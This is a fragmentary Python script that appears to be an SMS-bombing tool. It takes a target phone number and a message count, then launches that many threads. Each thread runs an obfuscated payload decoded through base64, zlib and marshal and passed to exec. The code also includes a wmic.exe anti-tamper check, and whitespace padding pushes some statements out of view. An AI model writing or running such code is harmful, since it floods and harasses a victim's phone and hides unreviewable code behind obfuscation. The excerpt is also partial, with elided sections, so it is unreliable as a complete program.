...
def antihwidbasic():
    ...
    from os import system 
    try:
        (Language, Codepage)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             = win32api.GetFileVersionInfo("wmic.exe", "\\VarFileInfo\\Translation")[0]

        original                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         = {"ProductName": "Microsoft® Windows® Operating System", "FileDescription": "WMI Commandline Utility", "OriginalFilename": "wmic.exe.mui"}

        for                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             details_name in original:
            if                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          win32api.GetFileVersionInfo("wmic.exe", "\\StringFileInfo\\%04X%04X\\%s" % (Language, Codepage, details_name)) != original[details_name]: 
                print                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ("Don't Crack ME")
                input()
                sys.exit(1)
    except:
        print("Don't Crack Me")
...
Anime.Fade(Center.Center(banner), Colors.rainbow, Colorate.Horizontal, enter=True)

def NTP():
    os.system("title SPAMSMS")
 ...
 """))
    print("") 
    phone = input("[+]\33[;34mEnter Phone : \33[;34m")
    count = int(input("[+]\33[;34mEnter Count : \33[;34m"))
    print()
    sleep(2)
    ...
    def anfio():
        try:
            exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrdWFgYCgtyskvSM3TUM8oKSmw0tdPrNDNzczJzNMrKSpNTUnJK9ZLzs+1MjMwsjDT1y8uSUxPLSrWL3JM0yuoVNfUK0pNTNHQBAB3txfq')))))
        except:pass
    ...
    for i in range(count):
        ...
        threading.Thread(target=anfio).start()
